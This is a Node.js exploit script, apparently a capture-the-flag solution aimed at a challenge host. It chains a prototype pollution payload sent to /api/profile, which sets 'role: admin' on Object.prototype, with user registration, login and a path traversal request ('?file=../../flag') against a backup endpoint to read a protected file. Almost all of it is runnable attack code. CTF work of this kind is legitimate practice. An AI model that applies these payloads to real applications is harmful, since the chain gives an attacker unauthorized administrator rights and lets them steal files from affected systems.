
const http = require('http');
const querystring = require('querystring');

// Step 1: Poison Object.prototype.role = admin via /api/profile
// Because /api/profile accepts json, we can poison here
const poisonData = JSON.stringify({
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
});

const poisonOptions = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/api/profile',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(poisonData)
  }
};

console.log("Poisoning prototype...");
const poisonReq = http.request(poisonOptions, (res) => {
  let body = '';
  res.on('data', chunk => body += chunk);
  res.on('end', () => {
    console.log("Poison done, now register...");
    // Now register new user, since role already exists on prototype, default won't be set
    registerUser();
  });
});
poisonReq.on('error', err => console.error(err));
poisonReq.write(poisonData);
poisonReq.end();

function registerUser() {
  const http = require('http');
  const querystring = require('querystring');

  const postData = querystring.stringify({
    "username": "finalhack"
  });

  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/register',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("\nRegistration done:");
      console.log(body);
      let match = body.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (match) {
        let uid = match[1];
        console.log("\nGot UID:", uid);
        loginAndCheck(uid);
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function loginAndCheck(uid) {
  const http = require('http');
  const querystring = require('querystring');

  const postData = querystring.stringify({
    "uid": uid
  });

  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/login',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(options, (res) => {
    let setCookie = res.headers['set-cookie'];
    let cookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';
    getPage('/dashboard', cookie, (body) => {
      console.log("\nDashboard after login:");
      console.log(body);
      // Check if we are admin
      if (body.includes("tag.admin")) {
        console.log("\n🎉 SUCCESS! We are admin! Now looking for backup...");
        // The backup button is on the dashboard, let's see the link
        let backupLinkMatch = body.match(/<a[^>]+href="([^"]+)"/i);
        let backupPath = backupLinkMatch ? backupLinkMatch[1] : "/api/backup";
        getPage(backupPath + "?file=../../flag", cookie, (backupBody) => {
          console.log("\n🏁 FLAG RESULT:");
          console.log(backupBody);
        });
      }
    });
  });
  req.on('error', err => console.error(err));
  req.write(postData);
  req.end();
}

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}
